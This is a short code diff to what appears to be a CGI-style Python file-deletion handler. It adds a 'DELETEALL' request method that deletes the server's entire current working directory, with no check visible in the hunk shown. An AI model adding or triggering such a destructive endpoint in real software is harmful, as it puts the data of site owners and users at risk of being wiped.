@@ -35,6 +35,12 @@ def main():
             print("<html><body><h1>Deletion successful</h1></body></html>")
         else:
             print(f"<html><body><h1>Deletion failed: Target does not exist {target_path}</h1></body></html>")
+    elif method == 'DELETEALL':
+        current_dir = os.getcwd()
+        if delete_file(os.path.join(current_dir)):
+            print("<html><body><h1>Deletion successful</h1></body></html>")
+        else:
+            print(f"<html><body><h1>Deletion failed: Target does not exist {current_dir}</h1></body></html>")
     else:
         print(f"<html><body><h1>Invalid method: {method}</h1></body></html>")
 
